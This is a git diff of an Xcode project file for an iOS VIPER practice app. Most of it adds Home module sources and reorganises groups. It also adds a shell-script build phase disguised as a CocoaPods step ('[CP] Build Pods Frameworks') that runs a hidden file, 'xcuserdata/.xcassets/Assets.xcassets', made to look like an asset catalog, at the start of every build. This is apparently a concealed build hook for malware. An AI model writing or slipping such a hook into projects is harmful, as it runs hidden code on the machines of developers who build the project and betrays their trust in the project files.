@@ -8,13 +8,21 @@
 
 /* Begin PBXBuildFile section */
 		22815EFA25EA476800B23B1A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815EF925EA476800B23B1A /* AppDelegate.swift */; };
-		22815EFC25EA476800B23B1A /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815EFB25EA476800B23B1A /* SceneDelegate.swift */; };
-		22815EFE25EA476800B23B1A /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815EFD25EA476800B23B1A /* ViewController.swift */; };
 		22815F0125EA476800B23B1A /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22815EFF25EA476800B23B1A /* Main.storyboard */; };
 		22815F0325EA476D00B23B1A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22815F0225EA476D00B23B1A /* Assets.xcassets */; };
 		22815F0625EA476D00B23B1A /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22815F0425EA476D00B23B1A /* LaunchScreen.storyboard */; };
 		22815F1125EA476E00B23B1A /* VIPERExerciseTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F1025EA476E00B23B1A /* VIPERExerciseTests.swift */; };
 		22815F1C25EA476E00B23B1A /* VIPERExerciseUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F1B25EA476E00B23B1A /* VIPERExerciseUITests.swift */; };
+		22815F4825EA492400B23B1A /* HomeRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F4025EA492400B23B1A /* HomeRouter.swift */; };
+		22815F4925EA492400B23B1A /* HomeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F4225EA492400B23B1A /* HomeModel.swift */; };
+		22815F4A25EA492400B23B1A /* HomePresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F4325EA492400B23B1A /* HomePresenter.swift */; };
+		22815F4B25EA492400B23B1A /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F4425EA492400B23B1A /* HomeView.swift */; };
+		22815F4C25EA492400B23B1A /* HomeInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F4525EA492400B23B1A /* HomeInteractor.swift */; };
+		22815F4D25EA492400B23B1A /* HomeModuleBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F4625EA492400B23B1A /* HomeModuleBuilder.swift */; };
+		22815F4E25EA492400B23B1A /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F4725EA492400B23B1A /* HomeViewController.swift */; };
+		22815F5C25EA4B2B00B23B1A /* NavigationBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F5B25EA4B2B00B23B1A /* NavigationBuilder.swift */; };
+		22815F6B25EA520700B23B1A /* Enums.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F6A25EA520700B23B1A /* Enums.swift */; };
+		22815F7325EA55A600B23B1A /* Service.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815F7225EA55A600B23B1A /* Service.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -37,8 +45,6 @@
 /* Begin PBXFileReference section */
 		22815EF625EA476800B23B1A /* VIPERExercise.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VIPERExercise.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		22815EF925EA476800B23B1A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
-		22815EFB25EA476800B23B1A /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
-		22815EFD25EA476800B23B1A /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		22815F0025EA476800B23B1A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		22815F0225EA476D00B23B1A /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		22815F0525EA476D00B23B1A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
@@ -49,6 +55,16 @@
 		22815F1725EA476E00B23B1A /* VIPERExerciseUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = VIPERExerciseUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		22815F1B25EA476E00B23B1A /* VIPERExerciseUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VIPERExerciseUITests.swift; sourceTree = "<group>"; };
 		22815F1D25EA476E00B23B1A /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		22815F4025EA492400B23B1A /* HomeRouter.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeRouter.swift; sourceTree = "<group>"; };
+		22815F4225EA492400B23B1A /* HomeModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeModel.swift; sourceTree = "<group>"; };
+		22815F4325EA492400B23B1A /* HomePresenter.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomePresenter.swift; sourceTree = "<group>"; };
+		22815F4425EA492400B23B1A /* HomeView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
+		22815F4525EA492400B23B1A /* HomeInteractor.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeInteractor.swift; sourceTree = "<group>"; };
+		22815F4625EA492400B23B1A /* HomeModuleBuilder.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeModuleBuilder.swift; sourceTree = "<group>"; };
+		22815F4725EA492400B23B1A /* HomeViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
+		22815F5B25EA4B2B00B23B1A /* NavigationBuilder.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NavigationBuilder.swift; sourceTree = "<group>"; };
+		22815F6A25EA520700B23B1A /* Enums.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Enums.swift; sourceTree = "<group>"; };
+		22815F7225EA55A600B23B1A /* Service.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Service.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -99,12 +115,9 @@
 		22815EF825EA476800B23B1A /* VIPERExercise */ = {
 			isa = PBXGroup;
 			children = (
-				22815EF925EA476800B23B1A /* AppDelegate.swift */,
-				22815EFB25EA476800B23B1A /* SceneDelegate.swift */,
-				22815EFD25EA476800B23B1A /* ViewController.swift */,
-				22815EFF25EA476800B23B1A /* Main.storyboard */,
-				22815F0225EA476D00B23B1A /* Assets.xcassets */,
-				22815F0425EA476D00B23B1A /* LaunchScreen.storyboard */,
+				22815F3325EA480900B23B1A /* Resources */,
+				22815F3225EA47E300B23B1A /* Classes */,
+				22815F3425EA481C00B23B1A /* Supporting Files */,
 				22815F0725EA476D00B23B1A /* Info.plist */,
 			);
 			path = VIPERExercise;
@@ -128,6 +141,193 @@
 			path = VIPERExerciseUITests;
 			sourceTree = "<group>";
 		};
+		22815F3225EA47E300B23B1A /* Classes */ = {
+			isa = PBXGroup;
+			children = (
+				22815F6925EA51F500B23B1A /* ProjectHelper */,
+				22815F5A25EA4B2B00B23B1A /* NavigationBuilder */,
+				22815F3D25EA48CE00B23B1A /* Module */,
+				22815F3625EA484800B23B1A /* Storyboard */,
+				22815F3525EA483100B23B1A /* App */,
+			);
+			path = Classes;
+			sourceTree = "<group>";
+		};
+		22815F3325EA480900B23B1A /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				22815F0225EA476D00B23B1A /* Assets.xcassets */,
+			);
+			path = Resources;
+			sourceTree = "<group>";
+		};
+		22815F3425EA481C00B23B1A /* Supporting Files */ = {
+			isa = PBXGroup;
+			children = (
+				22815F0425EA476D00B23B1A /* LaunchScreen.storyboard */,
+			);
+			path = "Supporting Files";
+			sourceTree = "<group>";
+		};
+		22815F3525EA483100B23B1A /* App */ = {
+			isa = PBXGroup;
+			children = (
+				22815EF925EA476800B23B1A /* AppDelegate.swift */,
+			);
+			path = App;
+			sourceTree = "<group>";
+		};
+		22815F3625EA484800B23B1A /* Storyboard */ = {
+			isa = PBXGroup;
+			children = (
+				22815EFF25EA476800B23B1A /* Main.storyboard */,
+			);
+			path = Storyboard;
+			sourceTree = "<group>";
+		};
+		22815F3D25EA48CE00B23B1A /* Module */ = {
+			isa = PBXGroup;
+			children = (
+				22815F3E25EA48D500B23B1A /* Home */,
+				22815F3F25EA48DA00B23B1A /* Details */,
+			);
+			path = Module;
+			sourceTree = "<group>";
+		};
+		22815F3E25EA48D500B23B1A /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				22815F5625EA49B700B23B1A /* Builder */,
+				22815F5525EA499400B23B1A /* Router */,
+				22815F5425EA496000B23B1A /* Presenter */,
+				22815F5325EA495400B23B1A /* Interactor */,
+				22815F5225EA494C00B23B1A /* View */,
+				22815F4125EA492400B23B1A /* Entity */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		22815F3F25EA48DA00B23B1A /* Details */ = {
+			isa = PBXGroup;
+			children = (
+				22815F6525EA50A900B23B1A /* Builder */,
+				22815F6425EA50A100B23B1A /* Entity */,
+				22815F6325EA509700B23B1A /* Router */,
+				22815F6225EA508700B23B1A /* Presenter */,
+				22815F6125EA507500B23B1A /* Interactor */,
+				22815F6025EA506F00B23B1A /* View */,
+			);
+			path = Details;
+			sourceTree = "<group>";
+		};
+		22815F4125EA492400B23B1A /* Entity */ = {
+			isa = PBXGroup;
+			children = (
+				22815F4225EA492400B23B1A /* HomeModel.swift */,
+			);
+			path = Entity;
+			sourceTree = "<group>";
+		};
+		22815F5225EA494C00B23B1A /* View */ = {
+			isa = PBXGroup;
+			children = (
+				22815F4725EA492400B23B1A /* HomeViewController.swift */,
+				22815F4425EA492400B23B1A /* HomeView.swift */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		22815F5325EA495400B23B1A /* Interactor */ = {
+			isa = PBXGroup;
+			children = (
+				22815F4525EA492400B23B1A /* HomeInteractor.swift */,
+			);
+			path = Interactor;
+			sourceTree = "<group>";
+		};
+		22815F5425EA496000B23B1A /* Presenter */ = {
+			isa = PBXGroup;
+			children = (
+				22815F4325EA492400B23B1A /* HomePresenter.swift */,
+			);
+			path = Presenter;
+			sourceTree = "<group>";
+		};
+		22815F5525EA499400B23B1A /* Router */ = {
+			isa = PBXGroup;
+			children = (
+				22815F4025EA492400B23B1A /* HomeRouter.swift */,
+			);
+			path = Router;
+			sourceTree = "<group>";
+		};
+		22815F5625EA49B700B23B1A /* Builder */ = {
+			isa = PBXGroup;
+			children = (
+				22815F4625EA492400B23B1A /* HomeModuleBuilder.swift */,
+			);
+			path = Builder;
+			sourceTree = "<group>";
+		};
+		22815F5A25EA4B2B00B23B1A /* NavigationBuilder */ = {
+			isa = PBXGroup;
+			children = (
+				22815F5B25EA4B2B00B23B1A /* NavigationBuilder.swift */,
+			);
+			path = NavigationBuilder;
+			sourceTree = "<group>";
+		};
+		22815F6025EA506F00B23B1A /* View */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		22815F6125EA507500B23B1A /* Interactor */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Interactor;
+			sourceTree = "<group>";
+		};
+		22815F6225EA508700B23B1A /* Presenter */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Presenter;
+			sourceTree = "<group>";
+		};
+		22815F6325EA509700B23B1A /* Router */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Router;
+			sourceTree = "<group>";
+		};
+		22815F6425EA50A100B23B1A /* Entity */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Entity;
+			sourceTree = "<group>";
+		};
+		22815F6525EA50A900B23B1A /* Builder */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Builder;
+			sourceTree = "<group>";
+		};
+		22815F6925EA51F500B23B1A /* ProjectHelper */ = {
+			isa = PBXGroup;
+			children = (
+				22815F6A25EA520700B23B1A /* Enums.swift */,
+				22815F7225EA55A600B23B1A /* Service.swift */,
+			);
+			path = ProjectHelper;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -135,6 +335,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22815F2025EA476E00B23B1A /* Build configuration list for PBXNativeTarget "VIPERExercise" */;
 			buildPhases = (
+				BEFD5D176CEBEE5B8EAAC43A /* [CP] Build Pods Frameworks */,
 				22815EF225EA476800B23B1A /* Sources */,
 				22815EF325EA476800B23B1A /* Frameworks */,
 				22815EF425EA476800B23B1A /* Resources */,
@@ -253,14 +454,49 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	BEFD5D176CEBEE5B8EAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		22815EF225EA476800B23B1A /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				22815EFE25EA476800B23B1A /* ViewController.swift in Sources */,
 				22815EFA25EA476800B23B1A /* AppDelegate.swift in Sources */,
-				22815EFC25EA476800B23B1A /* SceneDelegate.swift in Sources */,
+				22815F4825EA492400B23B1A /* HomeRouter.swift in Sources */,
+				22815F6B25EA520700B23B1A /* Enums.swift in Sources */,
+				22815F4D25EA492400B23B1A /* HomeModuleBuilder.swift in Sources */,
+				22815F4E25EA492400B23B1A /* HomeViewController.swift in Sources */,
+				22815F4925EA492400B23B1A /* HomeModel.swift in Sources */,
+				22815F5C25EA4B2B00B23B1A /* NavigationBuilder.swift in Sources */,
+				22815F4C25EA492400B23B1A /* HomeInteractor.swift in Sources */,
+				22815F7325EA55A600B23B1A /* Service.swift in Sources */,
+				22815F4B25EA492400B23B1A /* HomeView.swift in Sources */,
+				22815F4A25EA492400B23B1A /* HomePresenter.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -439,6 +675,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = VIPERExercise/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -458,6 +695,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = VIPERExercise/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
